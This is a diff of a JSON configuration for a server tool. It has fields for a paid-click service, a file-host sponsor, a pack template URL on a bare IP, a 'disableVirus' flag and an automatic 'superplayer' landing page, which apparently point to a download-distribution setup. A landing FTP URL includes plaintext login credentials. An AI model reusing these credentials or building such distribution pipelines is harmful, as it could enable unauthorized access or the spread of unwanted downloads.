@@ -1,21 +1,25 @@
 {
   "version": "2026.06.16 14:24:45",
+  "urlDoc": "",
   "disabled": false,
   "disableVirus": false,
   "bux": [
     {
       "enabled": false,
-      "id": "unu.im"
+      "id": "unu.im",
+      "apiKey": "",
+      "apiUrl": ""
     }
   ],
   "dnSponsor": [
     {
       "enabled": false,
-      "id": "ufiler.biz"
+      "id": "ufiler.biz",
+      "url": ""
     }
   ],
   "pack": {
-    "packFolder": "/root/hephaestus_data/default/server/packs",
+    "packFolder": "C:\\soft\\hephaestus_data\\default\\server\\packs",
     "packTemplateUrl": "http://26.188.115.1/pack/envelope",
     "items": []
   },
@@ -24,8 +28,8 @@
     "cloneServerIp": "",
     "profile": ""
   },
-  "serverIp": "26.188.115.1",
   "server": "default",
+  "alias": "",
   "landingAuto": true,
   "landingName": "superplayer",
   "landingFtp": "ftp://ftp:ftp123@tube-18.xyz/tube-18.xyz/",
